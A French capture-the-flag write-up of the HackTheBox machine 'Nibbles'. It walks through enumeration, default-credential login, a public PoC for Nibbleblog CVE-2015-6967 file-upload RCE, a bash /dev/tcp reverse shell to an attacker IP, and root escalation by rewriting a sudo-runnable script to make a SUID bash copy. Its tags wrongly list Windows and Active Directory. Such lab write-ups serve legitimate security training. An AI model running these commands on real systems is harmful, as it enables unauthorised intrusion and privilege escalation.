---
title: Nibbles
date: 2025-12-11 10:28:41
categories: ["Writeups", "Hackthebox", "Machines"]
tags: ["Easy", "Windows", "Active Directory", "CVE-2015-6967", "Nibbleblog"]
---

`Nibbles` est l'une des machines les plus faciles à exploiter sur HTB. Elle héberge une instance vulnérable de **Nibbleblog**. Il existe une faille exploitable avec `Metasploit`, mais il est également possible de l'exploiter sans MSF ; je vais donc vous montrer la méthode avec un POC GitHub. L'élévation de privilèges consiste à utiliser abusivement la commande `sudo` sur un fichier accessible en écriture à tous.

# Énumération 
## Nmap

Je lance un scan complet sur la machine.
```sh
rustscan -a 10.129.96.84 -u 5000 -- -sV -sC -oN fulltcpscan.txt
```

Je trouve alors deux ports ouverts :
- 22 pour le service SSH qui semble tourné sur une machine Ubuntu
- 80 pour le service HTTP qui semble avoir démarrer le service Apache
```sh
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP - TCP 80

Le site est statique avec comme contenu une balise `h2` Hello world!.
![](/images/Nibbles/Nibbles-1.png)

Le code source me donne un repertoire `/nibbleblog/`.
![](/images/Nibbles/Nibbles-2.png)

En m'y rendant, je vois alors qu'il s'agit d'un blog alimenté par le CMS [Nibbleblog](https://github.com/dignajar/nibbleblog).
![](/images/Nibbles/Nibbles-3.png)

Il n'y a pas grand chose d'intéressant sur cette page, donc je décide d'énumérer les répertoires avec [dirsearch](https://github.com/maurosoria/dirsearch).
```
dirsearch -u http://10.129.96.84/nibbleblog/
```

Je trouve plusieurs repertoires intéressants.
```
[15:20:13] 301 -   323B - /nibbleblog/admin  ->  http://10.129.96.84/nibbleblog/admin/
[15:20:13] 200 -    1KB - /nibbleblog/admin.php
[15:20:13] 200 -    2KB - /nibbleblog/admin/
[15:20:13] 403 -   313B - /nibbleblog/admin/.htaccess
[15:20:14] 301 -   334B - /nibbleblog/admin/js/tinymce  ->  http://10.129.96.84/nibbleblog/admin/js/tinymce/
[15:20:14] 200 -    2KB - /nibbleblog/admin/js/tinymce/
[15:20:19] 301 -   325B - /nibbleblog/content  ->  http://10.129.96.84/nibbleblog/content/
[15:20:19] 200 -    1KB - /nibbleblog/content/
[15:20:19] 200 -    1KB - /nibbleblog/COPYRIGHT.txt
[15:20:22] 200 -    3KB - /nibbleblog/index.php
[15:20:22] 200 -    3KB - /nibbleblog/index.php/login/
[15:20:22] 200 -    78B - /nibbleblog/install.php
[15:20:22] 200 -    78B - /nibbleblog/install.php?profile=default
[15:20:22] 301 -   327B - /nibbleblog/languages  ->  http://10.129.96.84/nibbleblog/languages/
[15:20:23] 200 -   34KB - /nibbleblog/LICENSE.txt
[15:20:26] 301 -   325B - /nibbleblog/plugins  ->  http://10.129.96.84/nibbleblog/plugins/
[15:20:26] 200 -    4KB - /nibbleblog/plugins/
[15:20:26] 200 -    5KB - /nibbleblog/README
[15:20:29] 301 -   324B - /nibbleblog/themes  ->  http://10.129.96.84/nibbleblog/themes/
[15:20:29] 200 -    2KB - /nibbleblog/themes/
[15:20:29] 200 -    2KB - /nibbleblog/update.php
```

La page `http://10.129.96.84/nibbleblog/admin` contient d'autres répertoires.
![](/images/Nibbles/Nibbles-4.png)

La page `http://10.129.96.84/nibbleblog/admin.php` est une page de connexion.
![](/images/Nibbles/Nibbles-5.png)

Sur la page `http://10.129.96.84/nibbleblog/README`, je vois que la version de Nibbleblog utilisée est la `4.0.3`.
![](/images/Nibbles/Nibbles-6.png)

Sur [cve.org](https://www.cve.org/CVERecord?id=CVE-2015-6967), je vois que cette version est vulnérable à une RCE grâce à de l'upload de fichier. Je trouve même un [POC](https://github.com/hadrian3689/nibbleblog_4.0.3). Sauf qu'il faut que m'authentifie avec des droits administrateurs. Je dois donc trouver les identifiants valides.

La page `http://10.129.96.84/nibbleblog/content/` contient 3 répertoires.
![](/images/Nibbles/Nibbles-7.png)

La page `http://10.129.96.84/nibbleblog/content/private` contient beaucoup de fichiers intéressants.
![](/images/Nibbles/Nibbles-8.png)

Le fichier `users.xml` contient la liste des utilisateurs ainsi que la liste des adresses IP black listées. Il n'y a que l'utilisateur `admin`. Ayant essayé quelques tentatives de connexion, je vois que mon adresse IP est black listée. Mais ce ne sera pas grave pour la suite des événements.
![](/images/Nibbles/Nibbles-9.png)

Il se trouve que les identifiants du blog soient `admin:nibbles`, après plusieurs combinaisons d'identifiants par défaut.
![](/images/Nibbles/Nibbles-10.png)

# Accès initial
## CVE-2015-6967

J'utilise alors le [POC](https://github.com/hadrian3689/nibbleblog_4.0.3) trouvé précédemment pour obtenir un shell.
```
python3 nibbleblog_4.0.3.py -t http://10.129.96.84/nibbleblog/admin.php -u admin -p nibbles -shell
```
![](/images/Nibbles/Nibbles-11.png)

Ce shell n'est pas très fonctionnel. Donc avec [penelope](https://github.com/brightio/penelope), j'obtiens un shell plus stable.
```
# Sur le shell instable
bash -c 'bash -i >& /dev/tcp/10.10.16.48/9001 0>&1'

# Sur la machine attaquante
penelope -p 9001
```
![](/images/Nibbles/Nibbles-12.png)

Le répertoire personnel de `nibbler` contient le flag ainsi qu' une archive zip.
![](/images/Nibbles/Nibbles-13.png)

# Escalade de privilèges 
## Énumération 

Cette archive ne contient qu'un seul fichier.
![](/images/Nibbles/Nibbles-14.png)

Notre utilisateur `nibbler` possède tous les droits sur ce fichier.
![](/images/Nibbles/Nibbles-15.png)

À ce stade le contenu du script ne m'intéresse pas vraiment vu que je ne l'utiliserai pas.
![](/images/Nibbles/Nibbles-19.png)


Avec la commande `sudo -l`, je vois que `nibbler` peut exécuter ce script en tant que root sans fournir de mot de passe.
![](/images/Nibbles/Nibbles-16.png)

## Shell en tant que root

Je modifie alors le contenu du script. Je fais une copie du `/bin/bash` et je lui donne les droits SUID. Cette copie aura les droits de l'utilisateur root.
```
#!/bin/bash
cp /bin/bash /tmp/rootme
chmod 4777 /tmp/rootme
```
![](/images/Nibbles/Nibbles-17.png)

J'exécute alors le script en tant que root. Cela crée alors le fichier `/tmp/rootme` qui me permet d'obtenir un shell en tant que root.
```
# Exécution du script en tant que root
sudo -u root /home/nibbler/personal/stuff/monitor.sh

# Obtention du shell en tant que root
/tmp/rootme -p
```
![](/images/Nibbles/Nibbles-18.png)
